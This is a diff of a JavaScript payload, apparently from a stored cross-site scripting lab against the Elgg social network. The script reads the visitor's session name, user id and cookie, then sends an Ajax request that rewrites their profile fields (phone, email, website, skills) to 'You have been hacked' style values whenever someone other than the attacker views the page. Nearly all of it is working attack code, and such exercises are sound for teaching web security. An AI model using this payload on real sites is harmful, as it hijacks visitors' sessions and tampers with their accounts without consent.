@@ -29,15 +29,8 @@
 &guid=44
 	
     */
-    var description = "&description=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=1";
-    var briefdescription = "&briefdescription=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bbriefdescription%5D=1";
-    var location = "&location=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Blocation%5D=1"
-    //var habijabi = "&interests=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Binterests%5D=1&skills=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bskills%5D=1&contactemail=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bcontactemail%5D=1&phone=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=1&website=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bwebsite%5D=1&twitter=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Btwitter%5D=1";
-    var namee = elgg.session.user.name;
-    //var namee = 'fahad'
-    var content=token+ts+namee+description+briefdescription+location+habijabi+"&guid="+elgg.session.user.guid; //FILL IN
 
-    //var params = JSON.stringify({__elgg_token : elgg.security.token.__elgg_token });
+    var namee = elgg.session.user.name;
 
     var userid = elgg.page_owner.guid;
 
@@ -62,7 +55,7 @@
     data.append('skills', 'You have been hacked');
     data.append('accesslevel[skills]', 1);
 
-    data.append('contactemail', 'You have been hacked');
+    data.append('contactemail', 'hacked@gmail.com');
     data.append('accesslevel[contactemail]', 1);
 
     data.append('phone', 'You have been hacked');
@@ -71,14 +64,13 @@
     data.append('mobile', 'You have been hacked');
     data.append('accesslevel[mobile]', 1);
 
-    data.append('website', 'You have been hacked');
+    data.append('website', 'www.hacked.com');
     data.append('accesslevel[website]', 1);
 
     data.append('twitter', 'You have been hacked');
     data.append('accesslevel[twitter]', 1);
 
     data.append('guid', elgg.session.user.guid);
-
 
     if(elgg.session.user.guid != userid)
     {
@@ -92,6 +84,7 @@
     Ajax.setRequestHeader("Cookie",document.cookie);
 
     Ajax.send(data);
+    console.log('success');
 	}
 	}
 </script>
